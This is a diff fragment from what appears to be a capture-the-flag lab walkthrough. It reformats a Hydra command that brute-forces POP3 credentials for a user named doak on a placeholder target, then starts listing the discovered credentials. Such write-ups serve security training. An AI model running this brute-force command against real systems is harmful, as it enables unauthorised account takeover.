@@ -64,7 +64,7 @@ Append entry:
     Inspecting internal messages/profile reveals contact with Dr Doak.
     Use Hydra to brute-force POP3 credentials for user doak:
 
-    ```hydra -l doak -P /usr/share/set/src/fasttrack/wordlist.txt <TARGET-IP> -s 55007 pop3```
+    hydra -l doak -P /usr/share/set/src/fasttrack/wordlist.txt <TARGET-IP> -s 55007 pop3
 Discovered POP3 Credentials (doak):
 
     Username: doak
